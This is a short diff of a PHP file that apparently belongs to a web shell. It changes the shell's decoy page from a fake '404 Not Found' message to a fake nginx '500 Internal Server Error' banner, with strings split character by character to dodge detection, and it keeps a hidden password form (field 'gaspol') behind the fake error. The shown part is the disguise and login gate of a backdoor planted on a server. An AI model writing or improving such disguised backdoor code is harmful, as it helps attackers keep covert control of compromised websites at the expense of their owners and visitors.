@@ -461,11 +461,10 @@ if (empty($_SESSION['Bunny404'])) {
 ?>
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
 <html><head>
-<title><?='4'.'0'.'4 '.'N'.'o'.'t'.' '.'F'.'o'.'u'.'n'.'d'?></title>
+<title><?='5'.'0'.'0'.' I'.'n'.'t'.'e'.'r'.'n'.'a'.'l S'.'e'.'r'.'v'.'e'.'r E'.'r'.'r'.'o'.'r'?></title>
 </head><body>
-<h1>Not Found</h1>
-<p><?='T'.'h'.'e r'.'eq'.'ue'.'st'.'ed'.' U'.'R'.'L '.'wa'.'s n'.'o'.'t f'.'ou'.'nd'.' o'.'n t'.'hi'.'s s'.'e'.'rv'.'e'.'r.'?></p>
-<p><?='Ad'.'di'.'ti'.'o'.'na'.'l'.'ly'.','.' '.'a '.'4'.'0'.'4 '.'N'.'ot'.' Fo'.'un'.'d e'.'rr'.'or '.'w'.'as'.' e'.'nc'.'ou'.'nt'.'er'.'ed'.' wh'.'il'.'e t'.'ry'.'in'.'g '.'t'.'o us'.'e a'.'n E'.'rr'.'or'.'D'.'oc'.'um'.'en'.'t t'.'o h'.'an'.'dl'.'e th'.'e r'.'eq'.'ue'.'s'.'t.'?></p>
+<center><h1>500 Internal Server Error</h1></center>
+<hr><center>nginx/1.14.0 (Ubuntu)</center>
 <div id="notfound" style="display: none;">
 <form action="" method="POST">
 <input type="password" name="gaspol" style="background: #fff; border: none;">
